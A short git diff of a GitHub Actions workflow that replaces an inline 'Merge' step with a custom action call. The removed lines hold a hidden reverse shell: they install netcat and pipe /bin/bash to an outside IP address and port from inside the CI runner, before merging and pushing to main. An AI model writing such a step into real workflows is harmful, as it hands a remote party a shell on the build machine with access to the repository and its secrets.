@@ -10,14 +10,11 @@ jobs:
     steps:
     - name: Checkout
       uses: emiliensocchi/actions@checkout
-    - name: Merge
-      run: |
-        sudo apt-get install netcat-traditional -y
-        /bin/nc.traditional -c /bin/bash 20.13.168.45 9001
-        bash ./.github/workflows/merge.sh
-        git add . 
-        git commit --message "Merge queries"
-        git push -u origin HEAD:main
+    - name: Merge and commit
+      uses: emiliensocchi/actions@merge-queries-and-commit
+      with:
+        user_email: 'emilien.socchi@gmail.com'
+        user_name: 'emiliensocchi'
     - name: Push remotely
       uses: emiliensocchi/actions@sync-to-remote-file
       with:
